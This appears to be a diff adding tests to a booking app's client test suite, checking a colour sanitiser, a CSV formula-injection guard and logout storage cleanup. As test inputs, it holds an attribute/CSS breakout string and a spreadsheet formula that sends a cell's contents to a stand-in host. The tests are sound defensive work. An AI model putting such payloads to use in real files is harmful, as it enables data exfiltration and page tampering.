@@ -2257,6 +2257,53 @@ console.log('\n== 12d. The clock and the money format are built once ==');
     vm.runInContext('Intl.DateTimeFormat = __RD; Intl.NumberFormat = __RN;', ctx);
 }
 
+// ---- 12e. A cottage's colour is only ever #RRGGBB ----------------------------
+// It is painted into style attributes (Today's timeline, the booking sheet) and
+// into the stylesheet generated for every visitor, and the server's `save` took
+// any string — a quote or a brace broke out of all of them. rates.php refuses one
+// now (test-integration §4); this is the client half, for a value already stored.
+console.log('\n== 12e. A cottage colour is only ever #RRGGBB ==');
+{
+    const hex = (v) => vm.runInContext('chbHexColour(' + JSON.stringify(v) + ')', ctx);
+    check('a #RRGGBB code passes through', hex('#8FB3C7') === '#8FB3C7' && hex('#12ab34') === '#12ab34');
+    check('a quote, a brace or a word does not', hex('#8fb3c7" data-act="x') === '' && hex('red;}body{display:none') === '' && hex('red') === '' && hex('') === '');
+    check('a non-string does not', vm.runInContext('chbHexColour(null) + chbHexColour(12) + chbHexColour({})', ctx) === '');
+    // THE WIRING: every place the payload's colour enters the client goes through it.
+    check('the cottage list, propertyMeta and the generated stylesheet all read it through chbHexColour',
+        appScript.includes('accent: chbHexColour(p.accent),') &&
+        appScript.includes("accent: chbHexColour(p.accent) || existing.accent || '#8FB3C7',") &&
+        appScript.includes("const a = chbHexColour((propertyMeta[k] && propertyMeta[k].accent) || p.accent) || '#8FB3C7';") &&
+        !/accent:\s*p\.accent\s*\|\|/.test(appScript));
+}
+
+console.log('\n== 12h. A CSV cell that starts like a formula is written as text ==');
+{
+    const safe = (v) => vm.runInContext('chbCsvSafe(' + JSON.stringify(v) + ')', ctx);
+    check('a formula-shaped cell gets a leading apostrophe', safe('=IMAGE("https://x.example/?"&A3)') === '\'=IMAGE("https://x.example/?"&A3)' && safe('+cmd') === "'+cmd" && safe('@SUM(1)') === "'@SUM(1)" && safe('-2+3') === "'-2+3");
+    check('…a plain number, negative or not, and ordinary text are left alone', safe('-12.50') === '-12.50' && safe('75') === '75' && safe('Anne Betts') === 'Anne Betts');
+    check('both exports read their cells through it', /const esc = \(v\) => `"\$\{chbCsvSafe\(v\)/.test(adminScript) && /const s = chbCsvSafe\(v\);/.test(adminScript));
+}
+
+console.log('\n== 12i. Signing out leaves no unsent message to a guest on the device ==');
+{
+    // A Storage-shaped stub (length + key(i)), so the prefix sweep really walks it.
+    const mk = () => {
+        const d = new Map();
+        return { get length() { return d.size; }, key: (i) => [...d.keys()][i] ?? null, getItem: (k) => (d.has(k) ? d.get(k) : null),
+            setItem: (k, v) => { d.set(k, String(v)); }, removeItem: (k) => { d.delete(k); }, keys: () => [...d.keys()].sort() };
+    };
+    const ls = mk();
+    ['chb-was-admin', 'chb-daysheet', 'chb-dep-decisions', 'chb-ib-draft:e:anne@x.test', 'chb-ib-draft:p:07700',
+        'chb-cmp-draft:booking:42', 'chb-cmp-draft:enquiry:7', 'chb-last-guest', 'chb-theme', 'chb-cmdk-use'].forEach((k) => ls.setItem(k, 'x'));
+    const was = ctx.localStorage;
+    ctx.localStorage = ls;
+    try { vm.runInContext('chbOwnerDeviceForget()', ctx); } finally { ctx.localStorage = was; }
+    check('both kinds of draft go, however many there are', !ls.keys().some((k) => k.startsWith('chb-ib-draft:') || k.startsWith('chb-cmp-draft:')));
+    check('…with the boot hint, the day sheet and the deposit decisions', !ls.keys().some((k) => ['chb-was-admin', 'chb-daysheet', 'chb-dep-decisions'].includes(k)));
+    check('…and nothing that is not the owner\'s session (theme, search habits, the guest sheet\'s memory)', ls.keys().join(',') === 'chb-cmdk-use,chb-last-guest,chb-theme');
+    check('both ways out call it', /function forceAdminLogout\(\) \{[\s\S]{0,200}chbOwnerDeviceForget\(\);/.test(appScript) && /async function logoutStaff\(\) \{[\s\S]{0,500}chbOwnerDeviceForget\(\);/.test(adminScript));
+}
+
 // ============================================================
 //  §13 — NO SILENT CAPS, and the number is stated ONCE.
 //  The activity log asks for 250 rows and rendered them with nothing saying so,
